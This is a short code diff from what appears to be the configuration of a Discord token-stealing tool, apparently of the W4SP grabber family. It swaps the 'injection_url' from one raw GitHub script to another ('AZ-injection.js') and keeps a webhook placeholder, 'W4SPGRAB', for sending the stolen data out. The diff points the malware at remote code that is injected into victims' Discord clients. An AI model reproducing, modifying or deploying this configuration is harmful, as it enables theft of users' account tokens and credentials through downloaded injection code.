@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/injection-1336.js",
+    injection_url: "https://raw.githubusercontent.com/AZbngg/injection/main/AZ-injection.js",
     webhook: "W4SPGRAB",
     Filter: {
         "urls": [
